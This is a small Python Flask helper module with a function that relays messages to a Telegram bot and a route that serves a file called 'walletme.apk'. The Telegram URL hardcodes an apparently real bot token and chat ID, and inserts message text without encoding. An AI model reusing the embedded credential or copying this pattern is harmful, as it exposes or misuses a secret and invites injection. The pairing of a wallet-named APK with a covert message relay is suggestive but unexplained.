import requests
import json
import random
import string

from flask import send_file


def send_message(message):
    url = f"https://api.telegram.org/bot6660557308:AAEwrg52_QSm0cBhFXWqLcOdHsGJPN6Fmv4/sendMessage?chat_id=-1002104620524&text={message}"

    try:
        response = requests.post(url)
        response.raise_for_status()  # Raise an exception for 4XX and 5XX status codes
        return response.json()
    except requests.exceptions.RequestException as e:
        print("Error sending message:", e)
        return None


def random_string(length=20):
    """Generate a random string of specified length."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


class HashAlreadyExist(Exception):
    pass


def download_apk():
    apk_file_path = 'walletme.apk'
    filename = 'walletme.apk'
    # Serve the APK file for download
    return send_file(apk_file_path, as_attachment=True, download_name=filename)
